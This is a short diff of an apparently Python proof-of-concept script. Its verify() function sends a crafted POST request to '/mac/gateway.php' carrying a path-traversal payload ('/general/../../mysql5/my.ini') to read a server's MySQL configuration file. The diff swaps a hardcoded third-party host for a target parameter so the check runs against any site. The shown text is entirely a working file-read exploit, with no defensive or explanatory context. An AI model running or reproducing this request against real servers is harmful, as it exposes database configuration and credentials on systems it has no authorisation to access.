@@ -10,7 +10,7 @@ import json
 import re
 
 def verify(site):
-    burp0_url = "http://app.kljy.com.cn:9000/mac/gateway.php"
+    burp0_url = site+"/mac/gateway.php"
     burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0", "Content-Type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip"}
     burp0_data = {"json": "{\"url\":\"/general/../../mysql5/my.ini\"}"}
     r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
